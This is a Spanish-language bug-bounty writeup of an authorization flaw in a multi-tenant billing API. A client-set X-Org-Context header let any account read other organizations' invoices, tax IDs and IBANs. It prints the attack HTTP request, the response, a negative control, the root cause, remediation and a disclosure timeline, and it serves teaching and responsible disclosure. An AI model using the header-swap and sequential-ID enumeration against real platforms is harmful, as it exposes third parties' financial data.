---
# ─── Identidad del writeup ──────────────────────────────────────
title:       "Acceso a la facturación de cualquier organización mediante una cabecera controlada por el cliente"
summary:     "El gateway validaba la firma del token, pero el servicio de facturación tomaba el identificador de organización de una cabecera HTTP que el cliente podía escribir. Una sesión de prueba leía las facturas, el CIF y los IBAN de cualquier otro cliente de la plataforma."
date:        2026-11-11 10:00:00 +0100

# ─── Metadatos que pintan las fichas y la cabecera ──────────────
severity:    high            # critical | high | medium | low | info
cvss:        "8.6"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
cwe:         "CWE-639"
vuln_class:  "Control de acceso"
target_type: "API REST multi-tenant"
platform:    "Programa privado"
status:      "Corregido"
fixed:       "9 días"
reward:      "Recompensado"
tags:        [idor, bola, api, multi-tenant, autorizacion, cabeceras]

# ─── Conclusiones (caja final del artículo) ─────────────────────
takeaways:
  - "Si un servicio interno acepta el tenant por cabecera, el borde no está autorizando: solo está autenticando."
  - "Las cabeceras `X-*` propietarias que aparecen en los bundles JavaScript son la mejor pista de autorización rota que existe."
  - "El control negativo —la misma petición *sin* la cabecera— es lo que convierte «he visto un 200» en un reporte defendible."
---

Durante la revisión de una plataforma SaaS de facturación con arquitectura multi-tenant
encontré un fallo de autorización a nivel de objeto que permitía a cualquier usuario
registrado leer los datos financieros completos de cualquier otra organización de la
plataforma. El vector no era un identificador en la URL —eso estaba bien controlado— sino
una **cabecera HTTP propietaria que el cliente podía escribir libremente**.

El fallo se reportó por el canal del programa, se corrigió en nueve días y se publica aquí
con su autorización, con todos los identificadores sustituidos por valores de laboratorio.

## La señal

El panel web cargaba sus datos a través de una API versionada en `/api/v2/`. Al leer el
bundle principal de la aplicación encontré el cliente HTTP que la propia web usa:

```javascript
// app.4f1c9d.chunk.js — interceptor de peticiones (reformateado)
instance.interceptors.request.use((config) => {
  config.headers["Authorization"] = `Bearer ${session.accessToken}`;
  config.headers["X-Org-Context"]  = store.getState().org.activeId;   // ← esto
  return config;
});
```

Dos cosas llamaron la atención a la vez:

1. El identificador de organización viaja **en una cabecera**, no derivado del token.
2. Su valor sale del estado del cliente (`store`), es decir, de algo que el navegador —y por
   tanto el atacante— controla por completo.

Una cabecera `X-*` que transporta un identificador de tenant es, en mi experiencia, la señal
de autorización rota con mejor relación coste/beneficio que existe. No prueba nada por sí
sola, pero genera una hipótesis muy concreta.

> **Hipótesis declarada antes de probar:** el borde valida la firma del JWT y asume que el
> contexto de organización ya viene comprobado; el servicio de facturación usa la cabecera
> como origen de verdad y no la contrasta con las pertenencias del usuario.
>
> *Lo que la confirma:* un `200` con datos de un tenant al que mi cuenta no pertenece.
> *Lo que la mata:* un `403` por discrepancia de contexto, o un `200` con datos de mi propio
> tenant (ignorando la cabecera).

## Preparación del entorno de prueba

Para no tocar datos de clientes reales en ningún momento, registré **dos organizaciones
propias** en el entorno de producción usando correos míos:

| Cuenta | Organización | Rol | Uso |
|---|---|---|---|
| `canario-a@…` | `4417` — *Lab Alpha* | Miembro | Origen del ataque |
| `canario-b@…` | `8831` — *Lab Bravo* | Propietario | Objetivo, con datos sembrados por mí |

En `Lab Bravo` creé dos facturas con importes y un IBAN inventados reconocibles. De esta
forma, cualquier dato que apareciera en la respuesta de la cuenta A sería trazable a mi
propio laboratorio y no a un tercero.

<div class="note" markdown="1">
Sembrar canarios propios en los dos lados de la frontera es lo que permite demostrar el
impacto **sin leer información de ningún usuario real**. El equipo receptor puede verificar
el reporte sin tener que auditar si hubo exposición de datos de clientes.
</div>

## Explotación

Desde la sesión de `canario-a` (organización `4417`), petición al endpoint de facturación de
la organización `8831`, añadiendo la cabecera con el tenant ajeno:

```http
GET /api/v2/organizations/8831/invoices HTTP/2
Host: api.ejemplo-objetivo.tld
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImM4YTEi...
X-Org-Context: 8831
Accept: application/json
```

La respuesta devolvió el registro financiero completo de la organización ajena:

```http
HTTP/2 200 OK
content-type: application/json; charset=utf-8

{
  "organization_id": 8831,
  "legal_name": "Lab Bravo S.L.",
  "tax_id": "B-8812****",
  "invoices": [
    {
      "number": "2026-0441",
      "total": 184250.00,
      "customer_email": "cfo@lab-bravo.invalid",
      "iban": "ES91 2100 **** **** 0418"
    }
  ]
}
```

<figure>
  <img src="{{ '/assets/img/writeups/idor-tenant/01-peticion-respuesta.svg' | relative_url }}"
       alt="Burp Repeater: petición con la sesión del tenant 4417 y cabecera X-Org-Context 8831, respuesta 200 OK con los datos del tenant 8831">
  <figcaption>La sesión pertenece a <code>4417</code>; la cabecera apunta a <code>8831</code>. La API responde con los datos de <code>8831</code>.</figcaption>
</figure>

El identificador de la URL y el de la cabecera tenían que coincidir, pero **ninguno de los
dos se contrastaba con el token**. Cambiando el par por `(8832, 8832)`, `(8833, 8833)`… se
recorría la plataforma entera; los identificadores son secuenciales, así que enumerarlos no
requiere adivinar nada.

<div class="impact" markdown="1">
**Impacto.** Cualquier usuario con una cuenta gratuita podía leer, para cualquier
organización de la plataforma: razón social, CIF, histórico de facturas con importes,
correos de contacto de facturación e IBAN parcialmente enmascarado. Esto es exposición de
datos fiscales y financieros de terceros, con implicaciones directas de RGPD para el
operador y utilidad inmediata para fraude dirigido al departamento financiero.
</div>

## Control negativo

Este es el paso que decide si hay reporte o no. Repetí **exactamente la misma petición,
cambiando una sola cosa**: eliminar la cabecera `X-Org-Context`.

```http
GET /api/v2/organizations/8831/invoices HTTP/2
Host: api.ejemplo-objetivo.tld
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImM4YTEi...
Accept: application/json
```

```http
HTTP/2 403 Forbidden

{ "error": "organization_scope_mismatch",
  "message": "Your session is not scoped to organization 8831." }
```

<figure>
  <img src="{{ '/assets/img/writeups/idor-tenant/02-control-negativo.svg' | relative_url }}"
       alt="Misma petición sin la cabecera X-Org-Context: la API responde 403 Forbidden con el error organization_scope_mismatch">
  <figcaption>Control negativo: sin la cabecera, el servidor <strong>sí</strong> aplica la autorización. El recurso no era público.</figcaption>
</figure>

Esto cierra las dos explicaciones alternativas que habrían invalidado el hallazgo:

- **No** era un recurso público: sin la cabecera, la autorización existe y deniega.
- **No** era un efecto de mi propia pertenencia: mi cuenta no es miembro de `8831`, y el
  propio mensaje de error lo confirma.

La cabecera no *añade* contexto: lo **sustituye**.

## Causa raíz

<figure>
  <img src="{{ '/assets/img/writeups/idor-tenant/03-flujo-ataque.svg' | relative_url }}"
       alt="Diagrama: el atacante envía la cabecera, el gateway valida solo la firma del JWT, el servicio de facturación confía en la cabecera y la base de datos devuelve el tenant ajeno">
  <figcaption>El borde autentica; nadie autoriza. La cabecera atraviesa la arquitectura sin contraste.</figcaption>
</figure>

El hueco está entre dos suposiciones que nunca se escribieron en el mismo sitio:

- **El gateway** asume que su trabajo es verificar que el token está firmado y no ha
  caducado. Lo hace bien.
- **El servicio de facturación** asume que si la petición ha llegado hasta él, el contexto de
  organización que la acompaña ya viene validado por el borde.

Ninguno de los dos compara el tenant solicitado con las pertenencias reales del usuario que
firma el token. La cabecera existía para una razón legítima —un usuario puede pertenecer a
varias organizaciones y conmutar entre ellas— pero se implementó como *dato de entrada* en
lugar de como *preferencia a validar*.

## Remediación

Lo que recomendé, en orden de prioridad:

1. **Derivar el tenant del token, no de la petición.** Las pertenencias del usuario deben
   resolverse en el servidor a partir del `sub` del JWT. Si se mantiene la cabecera por
   compatibilidad, tratarla como una *preferencia*: validar que el valor esté en la lista de
   organizaciones del usuario y rechazar con `403` en caso contrario.
2. **Autorizar en el servicio, no solo en el borde.** El servicio de facturación debe aplicar
   su propia comprobación de pertenencia antes de consultar la base de datos; un borde
   comprometido o un acceso lateral interno no deben bastar.
3. **Normalizar la cabecera en el perímetro.** El gateway debe eliminar o sobrescribir
   cualquier `X-Org-Context` entrante, de modo que nunca llegue un valor de origen cliente a
   la red interna.
4. **Detección.** Alertar sobre peticiones donde el tenant solicitado no coincide con
   ninguna pertenencia del `sub`: en una plataforma sana, ese evento debería ser
   prácticamente inexistente.

El equipo aplicó los puntos 1 y 3 en nueve días y confirmó el punto 2 en el siguiente ciclo
de release.

## Cronología

| Fecha | Hito |
|---|---|
| 2026-10-14 | Reporte enviado con prueba de concepto y control negativo |
| 2026-10-14 | Acuse de recibo del programa |
| 2026-10-16 | Triado como *High*, severidad aceptada sin cambios |
| 2026-10-23 | Corrección desplegada y verificada con las cuentas canario |
| 2026-11-11 | Publicación autorizada de este writeup |
